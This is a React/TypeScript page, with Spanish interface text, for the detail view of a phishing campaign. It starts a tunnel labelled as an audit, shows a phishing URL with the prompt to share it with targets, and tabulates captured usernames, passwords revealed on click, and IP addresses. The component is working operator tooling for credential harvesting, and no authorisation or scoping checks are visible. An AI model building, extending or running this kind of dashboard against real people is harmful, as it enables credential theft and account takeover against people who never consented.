import { AppLayout } from "@/components/layout/AppLayout";
import { useGetCampaign, useStartCampaign, useStopCampaign, useListCaptures, getGetCampaignQueryKey } from "@workspace/api-client-react";
import { useParams } from "wouter";
import { Activity, Copy, Play, Square, ShieldAlert, Globe, Clock, ExternalLink } from "lucide-react";
import { copyToClipboard, formatDate } from "@/lib/utils";
import { useToast } from "@/hooks/use-toast";
import { useQueryClient } from "@tanstack/react-query";
import { useState } from "react";

const STATUS_ES: Record<string, string> = {
  active: "Activa",
  draft: "Borrador",
  completed: "Completada",
  stopped: "Detenida",
};

export default function CampaignDetail() {
  const { id } = useParams();
  const campaignId = parseInt(id || "0", 10);
  const { data: campaign, isLoading } = useGetCampaign(campaignId);
  const { data: captures, isLoading: capturesLoading } = useListCaptures({ campaignId });
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});

  const startMutation = useStartCampaign({
    mutation: {
      onSuccess: () => {
        toast({ title: "¡Sesión iniciada!", description: "El túnel de auditoría está activo." });
        queryClient.invalidateQueries({ queryKey: getGetCampaignQueryKey(campaignId) });
      }
    }
  });

  const stopMutation = useStopCampaign({
    mutation: {
      onSuccess: () => {
        toast({ title: "Sesión detenida", description: "Túnel cerrado correctamente." });
        queryClient.invalidateQueries({ queryKey: getGetCampaignQueryKey(campaignId) });
      }
    }
  });

  const handleCopy = (text: string) => {
    copyToClipboard(text);
    toast({ title: "¡Copiado!", description: "URL copiada al portapapeles." });
  };

  if (isLoading) {
    return (
      <AppLayout>
        <div className="flex items-center justify-center h-64">
          <div className="w-8 h-8 border-4 border-primary/30 border-t-primary rounded-full animate-spin" />
        </div>
      </AppLayout>
    );
  }

  if (!campaign) {
    return <AppLayout><div className="p-8 text-destructive">Campaña no encontrada.</div></AppLayout>;
  }

  const isActive = campaign.status === 'active';

  return (
    <AppLayout
      title={campaign.name}
      description={campaign.description || "Sin descripción."}
    >
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-5 mb-6">

        {/* Panel de control */}
        <div className="col-span-1 bg-card border border-border rounded-xl p-5 shadow-lg flex flex-col">
          <div className="flex items-center justify-between mb-5">
            <h3 className="font-medium text-muted-foreground uppercase tracking-wider text-xs">Estado</h3>
            <div className={`px-3 py-1 text-xs font-bold uppercase rounded-full border ${
              isActive ? 'bg-green-500/10 text-green-400 border-green-500/30 shadow-[0_0_10px_rgba(34,197,94,0.2)]' :
              'bg-secondary text-muted-foreground border-border'
            }`}>
              {isActive && <span className="animate-pulse mr-1.5 inline-block w-1.5 h-1.5 bg-green-400 rounded-full" />}
              {STATUS_ES[campaign.status] || campaign.status}
            </div>
          </div>

          <div className="flex-1 flex flex-col items-center justify-center py-4 gap-4 border-y border-border/50 my-4">
            {!isActive ? (
              <button
                onClick={() => startMutation.mutate({ id: campaignId })}
                disabled={startMutation.isPending || campaign.status === 'completed'}
                className="w-full flex items-center justify-center gap-2 px-6 py-4 bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground font-bold rounded-xl transition-all shadow-[0_0_15px_rgba(0,255,255,0.1)] hover:shadow-[0_0_20px_rgba(0,255,255,0.4)] disabled:opacity-50 text-sm"
              >
                <Play className="w-5 h-5 fill-current" />
                {startMutation.isPending ? "Iniciando..." : "INICIAR AUDITORÍA"}
              </button>
            ) : (
              <button
                onClick={() => stopMutation.mutate({ id: campaignId })}
                disabled={stopMutation.isPending}
                className="w-full flex items-center justify-center gap-2 px-6 py-4 bg-destructive/10 text-destructive border border-destructive/30 hover:bg-destructive hover:text-destructive-foreground font-bold rounded-xl transition-all disabled:opacity-50 text-sm"
              >
                <Square className="w-5 h-5 fill-current" />
                {stopMutation.isPending ? "Terminando..." : "TERMINAR SESIÓN"}
              </button>
            )}
          </div>

          <div className="space-y-3 text-sm text-muted-foreground mt-2">
            <div className="flex justify-between">
              <span className="flex items-center gap-1.5"><Globe className="w-4 h-4" /> Túnel</span>
              <span className="font-mono text-foreground">{campaign.tunnelType}</span>
            </div>
            <div className="flex justify-between">
              <span className="flex items-center gap-1.5"><Clock className="w-4 h-4" /> Creada</span>
              <span>{formatDate(campaign.createdAt)}</span>
            </div>
          </div>
        </div>

        {/* URL e info */}
        <div className="col-span-1 lg:col-span-2 bg-card border border-border rounded-xl p-5 shadow-lg">
          <h3 className="font-semibold text-lg mb-5 flex items-center gap-2 text-foreground">
            <Activity className="w-5 h-5 text-primary" /> Detalles del Ataque
          </h3>

          {isActive && campaign.phishUrl ? (
            <div className="mb-6">
              <label className="block text-xs font-medium text-primary uppercase tracking-wider mb-2">
                URL de Phishing (¡Comparte este link!)
              </label>
              <div className="flex items-center gap-2">
                <div className="flex-1 bg-background border border-primary/30 p-3 rounded-lg font-mono text-green-400 text-xs md:text-sm overflow-x-auto whitespace-nowrap shadow-[inset_0_0_10px_rgba(0,255,255,0.05)]">
                  {campaign.phishUrl}
                </div>
                <div className="flex flex-col gap-1.5 shrink-0">
                  <button
                    onClick={() => handleCopy(campaign.phishUrl!)}
                    className="p-2.5 bg-secondary hover:bg-primary/20 hover:text-primary text-muted-foreground border border-border rounded-lg transition-colors"
                    title="Copiar URL"
                  >
                    <Copy className="w-4 h-4" />
                  </button>
                  <a
                    href={campaign.phishUrl}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="p-2.5 bg-secondary hover:bg-primary/20 hover:text-primary text-muted-foreground border border-border rounded-lg transition-colors"
                    title="Abrir link"
                  >
                    <ExternalLink className="w-4 h-4" />
                  </a>
                </div>
              </div>
              <p className="text-xs text-muted-foreground mt-2">
                Comparte esta URL con los objetivos de la auditoría. Las credenciales ingresadas serán capturadas automáticamente.
              </p>
            </div>
          ) : (
            <div className="mb-6 p-4 border border-dashed border-border/50 rounded-lg text-center text-muted-foreground text-sm">
              La URL de phishing aparecerá aquí cuando inicies la sesión.
            </div>
          )}

          <div className="grid grid-cols-2 gap-4">
            <div className="bg-background rounded-lg p-4 border border-border">
              <div className="text-xs text-muted-foreground uppercase mb-1">Plantilla</div>
              <div className="font-medium text-foreground flex items-center gap-2 text-sm">
                <div className="text-xl">🎣</div> {campaign.templateName}
              </div>
            </div>
            <div className="bg-background rounded-lg p-4 border border-border">
              <div className="text-xs text-muted-foreground uppercase mb-1">Credenciales Capturadas</div>
              <div className="text-2xl font-bold text-accent">
                {campaign.captureCount}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Tabla de capturas */}
      <div className="bg-card border border-border rounded-xl overflow-hidden shadow-lg">
        <div className="p-4 border-b border-border flex justify-between items-center bg-secondary/20">
          <h3 className="font-medium text-foreground flex items-center gap-2 text-sm">
            <ShieldAlert className="w-4 h-4 text-accent" />
            Credenciales Capturadas
          </h3>
          <span className="text-xs text-muted-foreground font-mono bg-background px-2 py-1 rounded border border-border">
            Total: {captures?.length || 0}
          </span>
        </div>

        {/* Tabla desktop */}
        <div className="overflow-x-auto hidden sm:block">
          <table className="w-full text-sm text-left">
            <thead className="text-xs text-muted-foreground uppercase bg-background border-b border-border">
              <tr>
                <th className="px-5 py-3 font-medium">Hora</th>
                <th className="px-5 py-3 font-medium">Usuario / Correo</th>
                <th className="px-5 py-3 font-medium">Contraseña</th>
                <th className="px-5 py-3 font-medium">IP</th>
              </tr>
            </thead>
            <tbody className="font-mono">
              {capturesLoading ? (
                <tr><td colSpan={4} className="p-6 text-center text-muted-foreground">Escaneando registros...</td></tr>
              ) : captures?.length === 0 ? (
                <tr><td colSpan={4} className="p-8 text-center text-muted-foreground italic">Sin capturas aún. Comparte el link para comenzar.</td></tr>
              ) : (
                captures?.map(cap => (
                  <tr key={cap.id} className="border-b border-border/50 hover:bg-secondary/30 transition-colors">
                    <td className="px-5 py-3 text-muted-foreground text-xs">{formatDate(cap.capturedAt)}</td>
                    <td className="px-5 py-3 text-cyan-400">{cap.username || '-'}</td>
                    <td className="px-5 py-3 cursor-pointer text-yellow-400/90" onClick={() => setShowPasswords(p => ({ ...p, [cap.id]: !p[cap.id] }))}>
                      {showPasswords[cap.id] ? cap.password : '••••••••'}
                      <span className="text-muted-foreground text-[10px] ml-2">{showPasswords[cap.id] ? '(ocultar)' : '(ver)'}</span>
                    </td>
                    <td className="px-5 py-3 text-muted-foreground text-xs">{cap.ipAddress || '-'}</td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>

        {/* Tarjetas móvil */}
        <div className="sm:hidden">
          {capturesLoading ? (
            <div className="p-6 text-center text-muted-foreground">Cargando...</div>
          ) : captures?.length === 0 ? (
            <div className="p-8 text-center text-muted-foreground italic text-sm">Sin capturas aún.</div>
          ) : (
            <div className="divide-y divide-border/50">
              {captures?.map(cap => (
                <div key={cap.id} className="p-4 space-y-1 font-mono text-sm">
                  <div className="text-cyan-400">{cap.username || '-'}</div>
                  <div className="text-yellow-400/90 cursor-pointer" onClick={() => setShowPasswords(p => ({ ...p, [cap.id]: !p[cap.id] }))}>
                    {showPasswords[cap.id] ? cap.password : '••••••••'} <span className="text-muted-foreground text-xs">(toca)</span>
                  </div>
                  <div className="text-xs text-muted-foreground">{cap.ipAddress} · {formatDate(cap.capturedAt)}</div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </AppLayout>
  );
}
